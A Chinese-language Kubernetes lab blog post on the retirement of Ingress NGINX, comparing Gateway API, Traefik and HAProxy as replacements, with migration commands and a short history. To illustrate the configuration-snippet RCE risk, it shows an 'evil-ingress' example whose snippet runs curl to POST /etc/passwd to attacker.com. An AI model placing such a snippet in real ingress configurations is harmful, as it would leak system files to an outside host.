## K8S Lab Day_50

# 再見了 Ingress NGINX

## 前言

最近看到了一個新聞，就是 2025 年 11 月 12 日，Kubernetes SIG Network 與 Security Response Committee 發出 Ingress NGINX 將於 2026 年 3 月正式退役，這個也是從以前到現在一個歷史性的存在吧！看到這個我也愣了一下，因為 Ingress NGINX 算是我在接觸 k8s 有使用到的元件，但是那時候其實還不太懂，只知道流量要進到 pod 就先用 ingress nginx 處理，後來仔細去看了公告之後才發現這個其實不是一個很突然的決定，因為在開源項目中，其實有很多維護的壓力，安全問題、技術債、維護人手不夠等等，但沒想到會在這時候退役，現在的生態真的是網 Gateway API 和 Traefik 轉換了，雖然要花很多時間去做重構和遷移，但對於整體的穩定性也是好事

## 我到底有沒有中獎？

看到這個訊息的時候當然還是要檢查一下，有沒有使用到這個元件，因為有可能平常沒有用到，但其實公司的 legacy 系統卻是有繼續使用到的

```bash
kubectl get pods --all-namespaces --selector app.kubernetes.io/name=ingress-nginx
```

## 應該要用什麼替代方案呢？

現在的 k8s 流量的入口已經有很多種選擇了，以前就是 Ingress NGINX 和一堆 annotation 現在是現在化的流量 API

| 方案                      | 優點                                        | 缺點         |
| ------------------------- | ------------------------------------------- | ------------ |
| **Gateway API**           | 官方未來、功能完整                          | CRD 複雜     |
| **Traefik**               | 原生支援 Ingress、IngressRoute、Gateway API | 輕量、現代化 |
| **HAProxy**               | 高效能                                      | 配置複雜     |
| **Emissary (Ambassador)** | 企業級                                      | 商業版付費   |

### Gateway API

假如要選擇的話，要以長期的方向去使用的話 Gateway API 應該是最直覺的選擇，因為他本身是 k8s SIG Network 預計要取代舊的 Ingress 的新標準，像是在 Gateway 可以控制誰管理 Listener、LoadBalancer，HTTPRoute 控制誰管理路由，TLSRoute / TCPRoute 把 L4 / L7 區分清楚等等，以前 Ingress 一個 YAML 要塞進所有的東西，而現在的 Gateway API 把所有則腳色都拆開

### Traefik

假如要快速上手的話，Traefik 似乎是比較好的選擇，他支援 Ingress 不用馬上換 API，也支援 IngressRoute，甚至支援 Gateway API，幾乎是拿來就可以用的工具，可以看看以下的例子

一開始的想法很簡單，先讓現有的 Ingress 不要壞掉，然後再慢慢把後面要用到的 CRD 或 Gateway API 加進來

```yaml
# 原本
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: api
spec:
  ingressClassName: nginx # ← 改這裡
  rules:
    - host: api.example.com
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: api-service
                port:
                  number: 80
```

但如果你的 cluster 裡有很多 Ingress，要一個一個改實在很痛苦，這時候就可以用 yq 搭配 kubectl 一次性過濾與更新，可以先 dry-run 看看，不急著 apply

```bash
kubectl get ingress --all-namespaces -o yaml | \
  yq 'select(.spec.ingressClassName == "nginx") | .spec.ingressClassName = "traefik"' | \
  kubectl apply -f -
```

接著就是把 Traefik 裝進 cluster 了

```bash
helm repo add traefik https://traefik.github.io/charts
helm repo update
```

可以先準備一份 `values.yaml`，主要開啟三個 providers，kubernetesCRD 支援 IngressRoute 等 Traefik CRD、kubernetesIngress 支援原生 Ingress、kubernetesGateway 支援 Gateway API

```yaml
providers:
  kubernetesCRD:
    enabled: true
  kubernetesIngress:
    enabled: true
  kubernetesGateway:
    enabled: true

ingressClass:
  enabled: true
  isDefaultClass: true

ports:
  websecure:
    port: 8443
    exposedPort: 443
    protocol: TCP

# Dashboard 安全設定
dashboard:
  enabled: true

extraObjects:
  - apiVersion: v1
    kind: Secret
    metadata:
      name: traefik-dashboard-auth
    type: kubernetes.io/basic-auth
    stringData:
      username: admin
      password: "Use-HTPasswd-Generator!"

  - apiVersion: traefik.io/v1alpha1
    kind: Middleware
    metadata:
      name: dashboard-auth
    spec:
      basicAuth:
        secret: traefik-dashboard-auth

  - apiVersion: networking.k8s.io/v1
    kind: Ingress
    metadata:
      name: traefik-dashboard
      annotations:
        traefik.ingress.kubernetes.io/router.entrypoints: websecure
    spec:
      ingressClassName: traefik
      rules:
        - host: traefik.local
          http:
            paths:
              - path: /
                pathType: Prefix
                backend:
                  service:
                    name: traefik
                    port:
                      name: traefik
      tls:
        - secretName: wildcard-tls
```

再來就是直接部署

```bash
helm upgrade --install traefik traefik/traefik \
  --namespace traefik --create-namespace \
  --values values.yaml
```

部署完成後，可以用簡單的方式去檢查有沒有成功家住流量，直接對已經改成 ingressClass=traefik 的 Ingress 發 request，看看是否還能正常的 routing

## HAProxy Ingress Controller

如果是想要一個少踩坑的方式，可以使用 HAProxy Ingress Controller，在 NGINX 要 retire 之後，因為手邊的專案也都很急，所以常常會遇到時間不夠，然後 Ingress 資源太多，Annotation 太過雜亂，也不能直接更改成 Gateway API，所以使用 HAProxy Ingress Controller 就變成最少調整成本的替代

過去的 nginx 常用的 annotations 也對現在的 haprozy 有直接的對應

```bash
nginx.ingress.kubernetes.io/rewrite-target  -> haproxy.org/rewrite-target
nginx.ingress.kubernetes.io/ssl-redirect    -> haproxy.org/ssl-redirect
nginx.ingress.kubernetes.io/cors-*          -> haproxy.org/cors-*
nginx.ingress.kubernetes.io/proxy-body-size -> haproxy.org/proxy-body-size
```

大多數的狀況也只需要 find & replace annotation prefix 就能完成替換，不是完全的 drop-in

## 怎麼出現的？

其實我們可以去找一下最一開始發布的版本，是在 2016 年的 v0.5.0，支援 Ingress API v1beta1，基於 NGINX 開源版 + F5 NGINX Plus，有基本路由 + TLS 終止，但沒有 annotations，後續的版本中才把 Annotations 的擴展加入

```yaml
apiVersion: extensions/v1beta1
kind: Ingress
metadata:
  name: demo
spec:
  rules:
    - host: demo.com
      http:
        paths:
          - path: /
            backend:
              serviceName: web
              servicePort: 80
```

那為何需要 Ingress 呢？ Service 只能暴露 ClusterIP / NodePort / LoadBalancer，外部的 HTTP traffic 需要 domain + routing + TLS，而在雲原生的時代中，一個 LB IP 乘載多個服務是必然要存在的

那為何是選則 NGINX 呢？因為當時最成熟的反向代理是 NGINX 且配置簡單效能也高，後續也因為剛剛提到的 annotation 擴展，和 CNCF 孵化還有 GKE、EKS、AKS 內建讓 Ingress NGINX 變成最多人使用的工具

而 Annotations 的靈活性也變成了他的致命傷，因為 Annotations 的過載，導致 configuration-snippet 可注入任意 NGINX 配置，產生 RCE 的風險 (Remote Code Execution)

```yaml
# configuration-snippet 是 Ingress NGINX Controller 提供的最危險的 annotation，允許使用者在 Ingress 資源中直接注入任意 NGINX 配置指令
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: evil-ingress
  annotations:
    nginx.ingress.kubernetes.io/configuration-snippet: |
      location /evil {
        # 直接執行系統指令！
        proxy_pass http://127.0.0.1:8080`$uri` `$args` && curl -X POST -d @/etc/passwd http://attacker.com;
      }
```

### Ingate

那為何沒有應急的方案呢，畢竟技術遷移就是一個大工程，能不動就不動 XD。這就要提到在 2024 年 11 月的新專案，`kubernetes-sigs/ingate`，他被定位成 k8s 的 Ingress + Gateway API 雙模式 Controller，核心目標是要橋接傳統的 Ingress API 和新的 Gateway API，並解耦 NGINX 讓 controller 更為的通用，所以才稱為 `Ingate` 源自於 "Ingress" + "Gateway"

那為何 Ingate 也胎使腹中呢？其實有個原因也跟 Ingress NGINX 一樣，社群人力不足，所以也導致了諸多的問題，沒有完整的 annotations 的支援、測試不足等等，接著 Gateway API 社群已有多個成熟實作像是 Envoy Gateway、HAProxy Unified，Ingate 無需強求「官方 NGINX 版」，但後續也因為 Ingate 也加入了生態的轉型

## 小結

Ingress NGINX 的退休其實也是一個時代的結束，不知道這樣講是不是誇大了，但也讓 k8s 的生態朝向 Gateway API 轉型，在這之後應該也會有很多團隊開始在這幾個生態中做出選擇，但其實現在能做的就是趕快盤點環境中使用的工具，趕快規劃和遷移，還有去了解現在生態系中所使用的工具是否有過多的 lagecy，畢竟技術的迭代是在這個產業必經的一條路，也希望在 2026 年大家的系統能夠順利的進行，這個過程也算是見證歷史的一刻呀！

## Reference

https://www.kubernetes.dev/blog/2025/11/12/ingress-nginx-retirement/

https://www.reddit.com/r/devops/comments/1ove34w/kubernetes_ingressnginx_is_retired_will_be/

https://www.haproxy.com/blog/ingress-nginx-is-retiring

https://www.f5.com/company/blog/nginx/nginx-ingress-controller-version-2-0-what-you-need-to-know

https://github.com/kubernetes-sigs/ingate

https://www.youtube.com/watch?v=KLwsV6_DntA
